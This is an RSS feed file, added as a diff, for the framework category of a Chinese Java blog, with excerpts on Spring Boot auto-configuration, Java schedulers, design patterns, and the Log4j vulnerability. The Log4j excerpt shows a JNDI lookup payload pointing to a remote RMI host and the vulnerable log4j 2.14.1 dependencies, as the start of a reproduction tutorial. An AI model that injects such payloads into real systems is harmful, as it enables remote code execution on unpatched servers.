@@ -1,0 +1,71 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Frame on Hadoo&#39;s Blog</title>
+    <link>https://hanchao666.top/categories/frame/</link>
+    <description>Recent content in Frame on Hadoo&#39;s Blog</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Wed, 31 May 2023 18:30:39 +0800</lastBuildDate><atom:link href="https://hanchao666.top/categories/frame/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>打破黑盒看SpringBoot自动装配原理</title>
+      <link>https://hanchao666.top/posts/learn-about-springboot-autowire/</link>
+      <pubDate>Wed, 31 May 2023 18:30:39 +0800</pubDate>
+      
+      <guid>https://hanchao666.top/posts/learn-about-springboot-autowire/</guid>
+      <description>SpringBoot凭借高度的封装和简单易上手的性质大大的降低了JavaEE开发的门槛，但作为开发者，我们要对系统中的组件做到知根知底，来增加可控性。下面就打破黑盒，来看一下SpringBoot是如何实现自动装配的。
+我们现在提到自动装配的时候，一般会和 Spring Boot 联系在一起。但是，实际上 Spring Framework 早就实现了这个功能。Spring Boot 只是在其基础上，通过 SPI 的方式，做了进一步优化。
+SpringBoot 定义了一套接口规范，这套规范规定：SpringBoot 在启动时会扫描外部引用 jar 包中的 META-INF/spring.factories文件，将文件中配置的类型信息加载到 Spring 容器（此处涉及到 JVM 类加载机制与 Spring 的容器知识），并执行类中定义的各种操作。对于外部 jar 来说，只需要按照 SpringBoot 定义的标准，就能将自己的功能装置进 SpringBoot。
+SpringBoot的易用性是比较出来的。对于Spring的使用，需要完成大量繁琐的显式配置，而SpringBoot通过少量注解和一些简单必要的配置就OK。自动装配可以简单理解为：通过注解或者一些简单的配置就能在 Spring Boot 的帮助下实现某块功能。
+SringBoot是如何实现自动装配的
+首先来看一下SpringBoot的核心注解：@SpringBootApplication
+@Target({ElementType.TYPE}) @Retention(RetentionPolicy.RUNTIME) @Documented @Inherited @SpringBootConfiguration @EnableAutoConfiguration @ComponentScan public @interface SpringBootApplication 大概可以把 @SpringBootApplication看作是 @Configuration、@EnableAutoConfiguration、@ComponentScan 注解的集合。根据 SpringBoot 官网，这三个注解的作用分别是：
+@EnableAutoConfiguration：启用 SpringBoot 的自动配置机制 @Configuration：允许在上下文中注册额外的 bean 或导入其他配置类 @ComponentScan： 扫描被@Component (@Service,@Controller)注解的 bean，注解默认会扫描启动类所在的包下所有的类 ，可以自定义不扫描某些 bean。如下图所示，容器中将排除TypeExcludeFilter和AutoConfigurationExcludeFilter。 @EnableAutoConfiguration 是实现自动装配的重要注解，我们以这个注解入手。
+@AutoConfigurationPackage @Import({AutoConfigurationImportSelector.class}) public @interface EnableAutoConfiguration{} 自动装配核心功能的实现是通过AutoConfigurationImportSelector类来实现，而 AutoConfigurationPackage的作用是将main包下的所有组件注册到容器中(AutoConfigurationPackage注册第三方组件， ComponentScan用来注册被 Component标注的组件)。</description>
+    </item>
+    
+    <item>
+      <title>Java定时任务调研</title>
+      <link>https://hanchao666.top/posts/about-java-schedule-frame/</link>
+      <pubDate>Tue, 23 Aug 2022 18:46:06 +0800</pubDate>
+      
+      <guid>https://hanchao666.top/posts/about-java-schedule-frame/</guid>
+      <description>项目中使用到定时任务的场景很常见，例如凌晨跑一个定时T+1任务、系统每隔一段时间执行一段代码逻辑等，下面对Java领域常见的定时任务方案做一个水平调研，最佳打开方式就是选择当前业务场景下最为合适的一款~
+单机定时任务选型 Timer java.util.Timer是 JDK 1.3 开始就已经支持的一种定时任务的实现方式。
+Timer 内部使用一个叫做 TaskQueue 的类存放定时任务，它是一个基于最小堆实现的优先级队列。TaskQueue 会按照任务距离下一次执行时间的大小将任务排序，保证在堆顶的任务最先执行。这样在需要执行任务时，每次只需要取出堆顶的任务运行即可！
+Timer 使用起来比较简单，通过下面的方式我们就能创建一个 1s 之后执行的定时任务。
+// 示例代码： TimerTask task = new TimerTask() { public void run() { System.out.println(&amp;#34;当前时间: &amp;#34; + new Date() + &amp;#34;n&amp;#34; + &amp;#34;线程名称: &amp;#34; + Thread.currentThread().getName()); } }; System.out.println(&amp;#34;当前时间: &amp;#34; + new Date() + &amp;#34;n&amp;#34; + &amp;#34;线程名称: &amp;#34; + Thread.currentThread().getName()); Timer timer = new Timer(&amp;#34;Timer&amp;#34;); long delay = 1000L; timer.schedule(task, delay); //输出： 当前时间: Wed July 6 15:18:47 CST 2022n线程名称: main 当前时间: Wed July 6 15:18:48 CST 2022n线程名称: Timer 不过其缺陷较多，比如一个 Timer 一个线程，这就导致 Timer 的任务的执行只能串行执行，一个任务执行时间过长的话会影响其他任务（性能非常差），再比如发生异常时任务直接停止（Timer 只捕获了 InterruptedException ）。</description>
+    </item>
+    
+    <item>
+      <title>从Spring及Mybatis框架源码中学习设计模式(创建型)</title>
+      <link>https://hanchao666.top/posts/learn-design-pattern-from-frame/</link>
+      <pubDate>Tue, 12 Jul 2022 18:36:16 +0800</pubDate>
+      
+      <guid>https://hanchao666.top/posts/learn-design-pattern-from-frame/</guid>
+      <description>设计模式是解决问题的方案，从大神的代码中学习对设计模式的使用，可以有效提升个人编码及设计代码的能力。本文主要看一下创建型的几个设计模式，即，单例模式、各种工厂模式 及 建造者模式。
+单例模式 个人理解 确保某个类只有一个实例，并提供该实例的获取方法。实际应用很多，不管是框架、JDK 还是实际的项目开发，但大都会使用“饿汉式”或“枚举”来实现单例。“懒汉式”也有一些应用，但通过“双检锁机制”来保证单例的实现很少见。
+实现方式 最简单的就是 使用一个私有构造函数、一个私有静态变量，以及一个公共静态方法的方式来实现。懒汉式、饿汉式等简单实现就不赘述咯，这里强调一下双检锁懒汉式实现的坑，以及枚举方式的实现吧，最后再结合 spring 源码 扩展一下单例 bean 的实现原理。
+1. 双检锁实现的坑
+/** * 双检锁 懒汉式，实现线程安全的单例 * 关键词：JVM指令重排、volatile、反射攻击 */ public class Singleton3 { /** * 对于我们初级开发来说，这个volatile在实际开发中可能见过，但很少会用到 * 这里加个volatile进行修饰，也是本单例模式的精髓所在。 * 下面的 instance = new Singleton3(); 这行代码在JVM中其实是分三步执行的： * 1、分配内存空间； * 2、初始化对象； * 3、将instance指向分配的内存地址。 * 但JVM具有指令重排的特性，实际的执行顺序可能会是1、3、2，导致多线程情况下出问题， * 使用volatile修饰instance变量 可以 避免上述的指令重排 * tips：不太理解的是 第一个线程在执行第2步之前就已经释放了锁吗？导致其它线程进入synchronized代码块 * 执行 instance == null 的判断？ * 回答：第一个线程在执行第2步之前就已经释放了锁吗？（没有）。如果不使用volatile修饰instance变量，那么其他线程进来的时候，看到的instance就有可能不是null的，因为已经执行了第3步，那么此时这个线程（执行 return instance;）使用的instance是一个没有初始化的instance，就会有问题。 */ private volatile static Singleton3 instance; private Singleton3(){ } public static Singleton3 getInstance(){ if(instance == null){ synchronized(Singleton3.</description>
+    </item>
+    
+    <item>
+      <title>Log4j漏洞攻击原理</title>
+      <link>https://hanchao666.top/posts/log4j-attack/</link>
+      <pubDate>Sat, 25 Dec 2021 17:48:25 +0800</pubDate>
+      
+      <guid>https://hanchao666.top/posts/log4j-attack/</guid>
+      <description>在轰动互联网的log4j漏洞之后，复现总结一下该漏洞原理。
+1.触发形式 就是打印个日志，怎么就有安全漏洞了？我们需要跳出常规化思考，如果计算机世界所有情况都是正常的，我们写代码也就不要那么多的try catch了。触发漏洞的入口，就在于log4j中的lookup方法，lookup方法在log4j中是如何使用的呢？
+当我们正常进行日志的打印时，是没有问题的，例如：
+public void login(string name){ String name = &amp;#34;test&amp;#34;; //表单接收name字段 logger.info(&amp;#34;{},登录了&amp;#34;, name); //logger为log4j } 但是logger.info中的{}是支持通配符的模式的，如果使用下面的代码片段：
+public void login(string name){ String name = &amp;#34;{$java:os}&amp;#34;; //用户输入的name内容为 {$java:os} logger.info(&amp;#34;{},登录了&amp;#34;, name); //logger为log4j } 那么打印出的结果就是 Windows 7 6.1 Service Pack 1, architecture: amd64-64，登录了
+如果要是输入以下形式的通配符：
+public void login(string name){ String name = &amp;#34;${jndi:rmi:192.168.9.23:1099/remote}&amp;#34;; //用户输入的name内容为 jndi相关信息 logger.info(&amp;#34;{},登录了&amp;#34;, name); } 那么lookup方法就会通过RMI进行远程方法调用，如果黑客在远端服务部署攻击脚本，GG。
+下面逆流而上，复现一个这个攻击过程~
+导入相关依赖 &amp;lt;dependencies&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.apache.logging.log4j&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;log4j-api&amp;lt;/artifactId&amp;gt; &amp;lt;version&amp;gt;2.14.1&amp;lt;/version&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.apache.logging.log4j&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;log4j-core&amp;lt;/artifactId&amp;gt; &amp;lt;version&amp;gt;2.14.1&amp;lt;/version&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;/dependencies&amp;gt; log4j.</description>
+    </item>
+    
+  </channel>
+</rss>
